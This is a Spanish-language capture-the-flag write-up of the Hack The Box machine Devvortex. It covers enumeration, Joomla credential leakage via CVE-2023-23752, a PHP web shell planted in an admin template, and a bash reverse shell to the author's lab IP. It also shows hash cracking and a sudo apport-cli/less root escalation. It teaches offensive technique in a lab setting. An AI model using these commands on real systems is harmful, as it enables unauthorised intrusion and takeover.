---
title: "Devvortex - HTB Writeup"
layout: single
excerpt: "Devvortex es una máquina fácil de Hack The Box. Para el acceso inicial a esta máquina vulneraremos un CMS Joomla expuesto en un subdominio 'dev'. Para conseguir un usuario nos pondremos a enumerar el sistema con credenciales previamente obtenidas y accediendo a un SQL obtendremos contraseñas hasheadas. Para root aprovecharemos un script que permite ejecutar con sudo."
show_date: true
classes: wide

toc: true
toc_label: "Contenido"
toc_icon: "cube"
toc_sticky: false


header:
  teaser: https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/7c819b40-3049-4149-b940-991e3e883441
  teaser_home_page: true
  icon: https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/2e9afb33-966a-4848-af53-9473877d2350

categories:
  - Writeup
  - Hack The Box
tags:
  - DNS-Resolution
  - Fuzzing
  - Joomla
  - CVE
  - Linux
  - Enumeration
  - SQL
  - Crypto
  - GTFobins
---

![Devvortex-header](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/3dbacac4-f786-460b-b68e-4731fda121b7)

# Reconocimiento
## Sistema operativo de la máquina
Lo primero sería entender bien con qué tipo de máquina estamos tratando recordar que según el TTL, el tiempo en el cual se almacenan los datos cache en servidor o máquina, en este caso dará un *ttl de 63*, debido a que es una máquina Linux, pero esta posee un intermediario y por ello se ve reducido el tiempo de respuesta.

| Sistema operativo | TTL |
| ----------------- | --- |
| Linux             | 64  |
| Windows           | 128 |

```bash
ping -c 1 10.10.11.242
```

![Pasted image 20240119135859](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/6cb5e21b-0520-47d6-b450-0878d361bf19)

# Escaneo y enumeración
## Nmap
```bash
sudo nmap -sS --min-rate 5000 -p- -Pn -n -vvv 10.10.11.242
```

>Parámetros utilizados: 
>* **-sS:** Syn Scan.
>* **--min-rate 5000:** Decimos que no emita paquetes mas grandes que 5000.
>* **-p-**: Escaneo enfocado en los 65535 puertos.
>* **-Pn:** Evitar realizar rastreo de la version del sistema operativo remoto.
>* **-n:** Evitar la resolución DNS, simplemente para que el escaneo vaya un poco mas rápido, ya que la maquina si lo aplica.
>* **-vvv:** Triple *verbose* para tener mayor información al momento mientras se realiza el escaneo.

![Pasted image 20240119140729](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/09bbf194-3ffd-4f13-89f4-76c68e7e7ae8)

## Resolución DNS
El servidor realiza *Resolución DNS*. Al realizar resolución dns significa que al tratar de ir a la `10.10.11.242` a través del navegador, este nos manda a esta dirección `http://devvortex.htb/` por tanto, se debe de agregar al `/etc/hosts`.

```bash
sudo nano /etc/hosts
	10.10.11.242     devvortex.htb
```
## Escaneando la web
### Fuzzing - Directorios
Realizando el fuzzing a los directorios, no llegue a mucho, pero igualmente dejo el escaneo que utilice para este caso.
```bash
wfuzz -c --hc=404 -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://devvortex.htb/FUZZ
```
### Fuzzing - Subdominios
En este punto del escaneo, había algo bastante interesante, un subdominio llamado 'dev'.
```bash
wfuzz -c --hc=404,302 -t 20 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://devvortex.htb/ -H "Host: FUZZ.devvortex.htb"
```

![Pasted image 20240119143352](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/7152aac8-98d6-492e-8d8b-7ec22c205f33)

Recordar agregarlo al `/etc/hosts` el subdominio encontrado, esta es la pista que debemos de seguir.
```bash
sudo nano /etc/hosts
	10.10.11.242    devvortex.htb dev.devvortex.htb
```
## Siguiendo la pista
Siguiendo esta pista llegue a una página web que nada entregaba, revise de casualidad si hay algún tipo de `robots.txt` expuesto, pues sí lo había, con una ruta `administrator` bastante interesante.

![Pasted image 20240119143829](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/d2dc78da-1c87-4cb4-b0f8-3ccf00bdfe86)

# Explotación
## Enumeración a través del CVE-2023-23752
Al entrar al panel `administrator` que obtuvimos al acceder al `robots.txt` vemos que hay un panel de inicio de sesión Joomla, pues bien, indagando un poco más, en busca de versiones u otras cosas, pude ver que hay una manera de obtener credenciales gracias a una vulnerabilidad presente, aquí puedes ir al [CVE](https://github.com/0xNahim/CVE-2023-23752) en cuestión para más detalles del error. Aclarar que trate de ingresar con algún tipo de SQLi basado en error, pero no funciono, ya saben, la típica `or 1=1--`.

![Pasted image 20240119143918](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/3594503c-7bfd-4941-aefd-d0283dba3d21)

En resumen en relación al CVE, esta vulnerabilidad está presente en la API de Joomla, específicamente en las versión 1, la cual sin requerir un token de autenticación, nos permite ver información pública de los usuarios, en el caso de esta máquina, están expuestas dos cuentas de usuario, una, que es la importante por ahora es la del usuario `lewis`, ya que podemos ver sus credenciales de autenticación en la base de datos.

![Pasted image 20240119151115](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/087e9f66-efbe-4948-917e-54a1880a7a9d)

## RCE a través del panel administrativo de Joomla

Colocando las credenciales que hemos conseguido `lewis:P4ntherg0t1n5r3c0n##` podemos ver que estamos dentro de un panel administrativo de Joomla, lo que queda ahora es buscar una manera de poder obtener ejecución remota de comandos, o enumerar algunas cosillas que podemos pillar en este panel. Tener muy en cuenta que el panel en el que estamos es `index.php` esto tomara más sentido adelante.

![Pasted image 20240119151358](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/79c2ef87-550a-40cb-aeab-9a1a865f39ed)

Bien, pues probando diferentes cosas, ya fuera algún panel que permita ejecutar comandos, credenciales SSH u otras maneras de enumerar, pues resulto todo en fallo, pero indagando más a fondo en el funcionamiento de Joomla, llegue a lo siguiente.

Pues bien, el panel administrativo de Joomla permite a los usuarios administradores cambiar partes del gestor de contenido a través de este mismo, en un panel que se encuentra en esta ruta `System > Templates > Administrator Templates` todo expuesto en el mismo panel que visualiza el administrador del lado izquierdo. Entrando a este, pude ver que hay un `index.php`, ¿recuerdas que dije que te acordaras de ello, que sería importante más adelante? Correcto, este panel será el cual trataremos de inyectar código, ya que es uno de los que visualizamos en este panel de editor.

Por lo tanto, lo suyo sería en este caso tratar de inyectar un hola mundo sencillo para ver si lo pilla, entonces agregamos un `echo "hola mundo";` y guardamos y cerramos, veamos que sucede.

![Pasted image 20240119160127](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/e802c8c8-8a13-46a7-a6e0-c4afb7b07cae)

![Pasted image 20240119205603](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/c21c0f66-d573-49d6-aa78-ea6a02c22dda)

Bien, como podemos ver, el código en PHP inyectado funciona, lo interpreta, por lo tanto, ahora lo suyo sería ver si nos permite utilizar `exec` o `system`. Lo primero será utilizar `system` para ver si podemos inyectar comandos, de la misma manera anterior vista anteriormente, agregamos nuestra nueva línea de código, y podemos ver que funciona.

```php
echo "<pre>" . system($_GET["cmd"]) . "</pre>";
```

![Pasted image 20240119205811](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/46682c74-ac12-46c1-a65a-347d7644cca2)

Ahora nos quedaría entablar la reverse shell, en este caso, digo de inmediato que tratando a través de `system` no lo conseguí, falle en todos los intentos y ninguno funciono. Por ende, lo que podemos tratar de hacer es utilizar `exec` para ver si ejecuta por detrás la reverse shell que le pasaremos, la cual es la siguiente en mi caso:

```bash
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.49/5656 0>&1'");
```

Bien, una vez puesto todo en su lugar, nuevamente, pasando por el proceso mencionado con anterioridad para acceder al panel de editor del administrador en Joomla, nos ponemos en escucha por algún puerto, en mi caso el `5656` con `netcat`.

```bash
nc -lnvp 5656
```

Una vez cuando nos pongamos en escucha, podemos guardar e ir al `index.php` y enhorabuena, tenemos acceso a la máquina.

![Pasted image 20240119210717](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/447569be-b4d2-412b-a88e-8a767e139407)

Ahora nos queda nada más hacerle un tratamiento a la TTY y podemos seguir avanzando en la búsqueda de resolver esta máquina.

```bash
script /dev/null -c /bin/bash
	ctrl_Z
	stty raw -echo; fg
xterm
export TERM=xterm
```

# Escalando privilegios
Hasta ahora, como `www-data` tenemos acceso, así que habrá que tratar de escalar privilegios, ya sea a `root` u otro usuario que pillemos en el sistema, por lo tanto, debemos de tratar de realizar enumeraciones.

## Escalación de privilegios - Logan
Bien, ¿recuerdas aquellas credenciales que tenemos del usuario `lewis` que obtuvimos anteriormente? Bueno, estas credenciales, si recordamos bien decían `db`, por tanto, quiero suponer que alguna base de datos opera por detrás y podemos utilizar estas mismas credenciales de Joomla para poder acceder a la base de datos, y efectivamente, estas credenciales funcionan (`lewis:P4ntherg0t1n5r3c0n##`).

![Pasted image 20240119211958](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/c506b495-f39f-4fb7-84c6-6c8e8ab4fdb2)

Dentro de esta consola de `MySQL` los comandos siguientes comandos:

```sql
USE joomla;
SHOW TABLES;
select * from sd4fg_users;
```

Pues, enumerando de manera rápida, vi la base de datos `Joomla` en esta había una tabla llamada `sd4fg_users` la cual contenía las credenciales del usuario `lewis`, el cual ya tenemos constancia, y uno más, `logan`. Este último, tiene una carpeta dentro del sistema (dentro del directorio `/home`), así que será nuestro objetivo, aunque hay un, pero antes de, tanto el usuario `lewis` como el usuario `logan` tienen las contraseñas hasheadas dentro de esta base de datos, tal parece un tipo de encriptado `blowfish`, muy común dentro de los sistemas operativos Linux. 

![Pasted image 20240119212341](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/be1b207a-92d8-4faf-b761-a3d4e7ca2e17)

Bien, entonces lo que sigue es sacar `JohnTheRipper` y un buen diccionario de fuerza bruta, en este caso, utilice el `rockyou.txt` en el cual está la contraseña de este usuario.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashLogan.txt
```

![Pasted image 20240119213130](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/828ef156-9b52-4987-b37c-84912767d05b)


Como podemos ver, ya tenemos la credenciales del usuario `logan:tequieromucho`, vamos a probarlas en `SSH` que si bien recordamos del escaneo, uno de los puertos abiertos era el `22`.

```bash
ssh logan@10.10.11.242
```

![Pasted image 20240119213502](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/1bdfc12b-8161-4039-b25c-40ac11b6688d)

En este punto ya podemos visualizar la flag de `user`, por tanto, solo nos quedaría avanzar hacia el usuario `root`.

## Escalación de privilegios - Root
Continuando con la escalación de privilegios al usuario `root`, pues buscando y enumerando el sistema no llegue a mucho, así que procedí a realizar un `sudo -l`, ya que tenemos credenciales del usuario `logan`, por tanto, podemos ver el resultado que nos entrega este comando.

![Pasted image 20240119213739](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/b22cd4e5-abb6-42ec-8787-9288cabdc713)

Podemos ver que hay un comando que puede utilizar el usuario `logan` el de `/usr/bin/apport-cli`, buscando en [GTFobins](https://gtfobins.github.io/) algo relacionado con este comando no llegue a nada.

![Pasted image 20240119214340](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/a12d3cf3-fd9d-492a-9016-acfed57e7cb4)

Pero indagando más en internet, llegue a que el famoso `apport-cli` es una manera de generar reportes de errores en el servidor al cual tenemos acceso en Linux, en este caso, la máquina. Luego de informarme un poco más acerca de aquel script que genera errores, llegue a una prueba de concepto (*POC*) de escalar privilegios que me resulto bastante interesante, y es que al generar un reporte, este al finalizar nos permite ver el reporte generado en cuestión, pero para poder visualizarlo según este *POC* este script utiliza la herramienta `less` disponible en Linux.

![Pasted image 20240119214736](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/1c1316a9-5e4f-40b3-bda4-6ad252e0f9db)

>**¿Que es el comando `less`?**
>* El comando `less` es un visor de texto que permite ver archivos de texto línea por línea, en forma paginada, algo similar a lo que realiza `vim`.

Bien, el script de reportes `apport-cli` requiere de algún programa gestionado por el gestor de paquetes, en este caso, el `dpkg`, podríamos ocupar el mismo comando `less` utilizado por el `apport-cli` para poder realizar este reporte.

![Pasted image 20240305220850](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/7b8e3292-fbf3-4b6a-90e0-2273665bde83)
![Pasted image 20240305222221](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/db4e7283-3fc1-41aa-937c-01bb18dbbbe4)


Bueno, teniendo en cuenta la salida, y comprendiendo que existe el uso de la herramienta `less` podemos revisar en él [GTFobins](https://gtfobins.github.io/) si encontramos algo relacionado con esta herramienta de Linux, y sí que lo había. 

![Pasted image 20240119221141](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/6247fbe9-128a-46d5-8276-4f8a4c4a6c64)

Suponiendo lo que vemos en la imagen, podríamos usar el ejemplo `a`donde utilizaremos `!/bin/sh`, lo cual nos dará una shell en la cual podremos introducir comandos. Entonces, ejecutamos:

```bash
sudo /usr/bin/apport-cli less
```

Seguimos los pasos para visualizar el reporte dando a la opción `V` y luego de ello escribimos `!/bin/sh`. 

![Pasted image 20240305222307](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/046d4499-60c9-40a9-ada9-07f2941b2c46)
![Pasted image 20240305222344](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/e4bdd335-a5e9-45d4-9a52-da52dbc741f2)

Como podemos ver, tenemos control de una shell con el usuario `root`, debemos de sacar la flag y la máquina **Devvortex** estará completada.

![Pasted image 20240305222508](https://github.com/Gr4ykt/gr4ykt.github.io/assets/78503985/61a0a7a5-83a5-4ad7-83b3-1367c0b095ef)
